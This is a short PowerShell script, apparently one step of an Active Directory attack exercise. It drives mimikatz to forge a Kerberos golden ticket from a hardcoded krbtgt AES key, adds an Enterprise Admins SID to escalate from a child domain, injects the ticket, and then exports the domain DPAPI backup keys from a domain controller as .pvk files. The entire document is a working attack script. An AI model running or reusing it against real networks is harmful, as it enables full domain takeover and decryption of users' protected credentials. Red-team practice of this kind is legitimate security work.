# 3.5G step 1: forge EA golden ticket + extract domain DPAPI backup key from dc01
$ErrorActionPreference = 'Continue'
$Mimi = 'C:\Tools\ADTools\mimikatz.exe'
$out = 'C:\Tools\ADTools'
$childSid = 'S-1-5-21-2616196951-1941128886-767624593'
$krbtgtAes = 'd64da42f8e5caeeb725d009b615eb98f4f05b121376ca38c1e1ee9dcb553d9d2'
$eaSid = 'S-1-5-21-277764030-1371232215-1561074416-519'

klist purge 2>&1 | Out-Null

Write-Output '=== FORGE EA GOLDEN + PTT ==='
& $Mimi "kerberos::golden /user:Administrator /domain:child.cadre.local /sid:$childSid /aes256:$krbtgtAes /sids:$eaSid /ptt" 'exit' 2>&1 | Select-String -Pattern 'Golden ticket|successfully submitted|User|SID|Groups' | Select-Object -First 8 | ForEach-Object { Write-Output "GOLDEN|$_" }

Write-Output '=== BACKUPKEYS FROM dc01 ==='
$o = "$out\wt035g-backupkeys.out"
Remove-Item $o -ErrorAction SilentlyContinue
cmd.exe /c "`"$Mimi`" lsadump::backupkeys /system:dc01.cadre.local /export > `"$o`" 2>&1"
Start-Sleep -Seconds 3
Write-Output "BACKUPKEYS_OUT_SIZE $((Get-Item $o -ErrorAction SilentlyContinue).Length)"
Get-Content $o -ErrorAction SilentlyContinue | Select-String -Pattern 'DPAPI|backup|Guid|Preferred|base64|\.pvk|ERROR|exported' | Select-Object -First 20 | ForEach-Object { $_.Line }
# list exported pvk files
Get-ChildItem $out -Filter '*.pvk' -ErrorAction SilentlyContinue | ForEach-Object { Write-Output "PVK_FILE|$($_.FullName)|$($_.Length)" }

klist purge 2>&1 | Out-Null
Write-Output '3.5G_STEP1_DONE'
